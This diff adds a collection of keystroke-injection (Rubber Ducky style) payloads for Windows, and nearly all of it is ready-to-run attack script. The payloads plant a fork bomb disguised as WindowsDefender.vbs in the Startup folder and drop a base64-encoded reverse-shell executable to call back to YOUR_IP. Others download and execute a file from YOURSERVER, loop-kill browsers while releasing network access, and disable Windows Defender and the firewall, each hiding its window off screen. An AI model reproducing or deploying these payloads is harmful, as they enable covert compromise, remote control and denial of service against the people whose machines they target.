@@ -1,0 +1,283 @@
+REM Persistence ForkBomb
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1200
+ALT s
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 500
+STRING cd %ProgramData%
+ENTER
+STRING cd Microsoft
+ENTER
+STRING cd Windows
+ENTER
+STRING cd Start Menu
+ENTER
+STRING cd Programs
+ENTER
+STRING cd Startup
+ENTER
+STRING erase /Q WindowsDefender.vbs
+ENTER
+STRING copy con WindowsDefender.vbs
+ENTER
+STRING do
+ENTER
+STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
+ENTER
+STRING loop
+CTRL z
+ENTER
+DELAY 50
+STRING start WindowsDefender.vbs && exit
+ENTER
+
+REM ForkBomb
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+STRING cd %USERPROFILE%
+ENTER
+STRING cd Documents
+ENTER
+STRING erase /Q WindowsDefender.vbs
+ENTER
+STRING copy con WindowsDefender.vbs
+ENTER
+STRING do
+ENTER
+STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
+ENTER
+STRING loop
+CTRL z
+ENTER
+DELAY 50
+STRING start WindowsDefender.vbs && exit
+ENTER
+
+REM ReverseShell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 12000
+ALT s
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 500
+STRING cd/
+ENTER
+STRING erase /Q decoder.vbs
+ENTER
+STRING copy con decoder.vbs
+ENTER
+STRING Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)
+STRING :outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS =
+STRING CreateObject("Scripting.FileSystemObject"):
+ENTER
+STRING set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded =
+STRING objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function
+STRING decodeBase64(base64):
+ENTER
+STRING dim DM, EL:Set DM = CreateObject("Microsoft.XMLDOM"):Set EL = DM.createElement("tmp"):
+STRING EL.DataType = "bin.base64":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub
+STRING writeBytes(file, bytes):Dim binaryStream:
+ENTER
+STRING Set binaryStream = CreateObject("ADODB.Stream"):binaryStream.Type = 1:
+STRING binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub
+ENTER
+CTRL z
+ENTER
+STRING erase /Q reverse.txt
+ENTER
+STRING copy con reverse.txt
+ENTER
+STRING TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA
+ENTER
+STRING AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA
+ENTER
+STRING AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA
+ENTER
+STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ENTER
+STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS
+ENTER
+STRING 0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA
+ENTER
+STRING AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2
+ENTER
+STRING gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A
+ENTER
+STRING AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA
+ENTER
+STRING WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA
+ENTER
+STRING MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq
+ENTER
+STRING kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF
+ENTER
+STRING EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv
+ENTER
+STRING KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp
+ENTER
+STRING AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm
+ENTER
+STRING MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A
+ENTER
+STRING VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s
+ENTER
+STRING hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9
+ENTER
+STRING gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp
+ENTER
+STRING bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY
+ENTER
+STRING LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B
+ENTER
+STRING /7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk
+ENTER
+STRING SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA
+ENTER
+STRING AAxAAADpdL7//wAAAAIAAAAMQAAA
+ENTER
+CTRL z
+ENTER
+STRING erase /Q reverse.exe
+ENTER
+STRING cscript decoder.vbs reverse.txt reverse.exe
+ENTER
+STRING reverse.exe YOUR_IP YOUR_PORT
+ENTER
+STRING exit
+ENTER
+
+REM DownloadAndExecuteFile
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 12000
+ALT s
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 1000
+STRING $down = New-Object System.Net.WebClient; $url = 'http://YOURSERVER/FILE'; $file = 'FILE.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER
+
+REM DenyNetAccess
+DELAY 1000
+GUI r
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 500
+STRING cd %USEPROFILE% && cd Downloads
+ENTER
+STRING erase /Q a.bat
+ENTER
+STRING copy con a.bat
+ENTER
+STRING @echo off
+ENTER
+STRING :Start
+ENTER
+STRING ipconfig /release
+ENTER
+STRING taskkill /f /im "iexplore.exe"
+ENTER
+STRING taskkill /f /im "firefox.exe"
+ENTER
+STRING taskkill /f /im "chome.exe"
+ENTER
+STRING taskkill /f /im "devenv.exe"
+ENTER
+STRING timeout /t 60
+ENTER
+STRING Goto Start
+ENTER
+CONTROL z
+ENTER
+STRING erase /Q invis.vbs
+ENTER
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL z
+ENTER
+STRING wscript.exe invis.vbs a.bat
+ENTER
+STRING exit
+ENTER
+
+REM DisableWindowsDefender
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 12000
+ALT s
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 1000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
+REM DisableFirewall
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 12000
+ALT s
+DELAY 500
+ALT SPACE
+STRING M
+LEFTARROW
+REPEAT 100
+ENTER
+DELAY 1000
+STRING netsh advfirewall set currentprofile state off
+ENTER
+STRING exit
+ENTER
